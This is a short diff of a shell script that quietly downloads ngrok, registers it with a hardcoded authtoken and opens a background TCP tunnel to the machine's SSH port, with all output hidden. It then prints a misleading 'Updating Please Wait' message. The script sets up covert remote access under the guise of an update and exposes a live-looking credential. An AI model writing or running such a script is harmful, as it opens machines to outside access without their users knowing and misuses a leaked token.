@@ -6,9 +6,7 @@ wget -O ngrok.zip
 https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
 unzip ngrok.zip > /dev/null 2>&1
 ./ngrok authtoken K7sHWI1hCsgCWtGrzyFoV7UYJr_4Uuvnt1k33VWHnEzJ8u7m
-
 clear
-
 ./ngrok tcp --region au 22 &>/dev/null &
 echo "======================="
 echo Updating Please Wait
